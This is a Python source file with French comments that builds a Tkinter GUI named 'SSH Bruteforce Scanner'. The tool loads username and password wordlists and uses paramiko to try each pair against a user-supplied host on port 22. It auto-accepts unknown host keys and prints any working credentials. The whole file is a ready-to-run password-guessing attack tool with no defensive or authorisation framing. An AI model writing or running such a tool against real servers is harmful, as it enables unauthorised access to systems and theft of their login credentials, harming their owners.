import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.scrolledtext import ScrolledText
import paramiko
from tqdm import tqdm

def load_file(file_path):
    """Lit un fichier et retourne une liste des lignes."""
    with open(file_path, 'r') as file:
        return file.read().splitlines()


def perform_ssh_bruteforce(host, port, usernames, passwords):
    """Effectue une attaque de force brute SSH."""
    for username in usernames:
        for password in tqdm(passwords, desc=f"Trying {username}"):
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
                print(f"[+] Login successful! Username: {username}, Password: {password}")
                ssh_client.close()
                return username, password
            except paramiko.AuthenticationException:
                continue
            except Exception as error:
                print(f"[-] Error: {error}")
                return None
    print("[-] Bruteforce attempt unsuccessful.")
    return None


def start_ssh_scan():
    """Démarre le scan SSH bruteforce basé sur les entrées utilisateur."""
    host = entry_host.get()
    if not host:
        messagebox.showwarning("Warning", "Please enter a valid IP address or hostname.")
        return

    username_file_path = entry_username.get()
    password_file_path = entry_password.get()
    if not username_file_path or not password_file_path:
        messagebox.showwarning("Warning", "Please select both username and password files.")
        return

    usernames = load_file(username_file_path)
    passwords = load_file(password_file_path)

    result = perform_ssh_bruteforce(host, 22, usernames, passwords)

    if result:
        username, password = result
        text_area.insert(tk.END, f"[+] Bruteforce successful! Username: {username}, Password: {password}\n")
    else:
        text_area.insert(tk.END, "[-] Bruteforce unsuccessful.\n")


def select_file(entry_field, file_type):
    """Ouvre une boîte de dialogue pour sélectionner un fichier et affiche le chemin dans l'entrée spécifiée."""
    file_path = filedialog.askopenfilename(title=f"Select {file_type} file", filetypes=[("Text files", "*.txt")])
    entry_field.delete(0, tk.END)
    entry_field.insert(0, file_path)


# Initialisation de la fenêtre principale
root = tk.Tk()
root.title("SSH Bruteforce Scanner")
root.geometry("800x600")

# Champ de saisie pour l'adresse IP ou le nom d'hôte
tk.Label(root, text="Enter IP address or hostname:").pack(pady=10)
entry_host = tk.Entry(root, width=50)
entry_host.pack()

# Bouton et champ pour sélectionner le fichier de noms d'utilisateur
tk.Button(root, text="Select username file", command=lambda: select_file(entry_username, "username")).pack(pady=5)
tk.Label(root, text="Username file:").pack()
entry_username = tk.Entry(root, width=50)
entry_username.pack()

# Bouton et champ pour sélectionner le fichier de mots de passe
tk.Button(root, text="Select password file", command=lambda: select_file(entry_password, "password")).pack(pady=5)
tk.Label(root, text="Password file:").pack()
entry_password = tk.Entry(root, width=50)
entry_password.pack()

# Bouton pour démarrer le scan
tk.Button(root, text="Scan", command=start_ssh_scan).pack(pady=10)

# Zone de texte pour afficher les résultats
text_area = ScrolledText(root, wrap=tk.WORD, width=80, height=20)
text_area.pack(padx=10, pady=10)

# Lancement de l'application
root.mainloop()
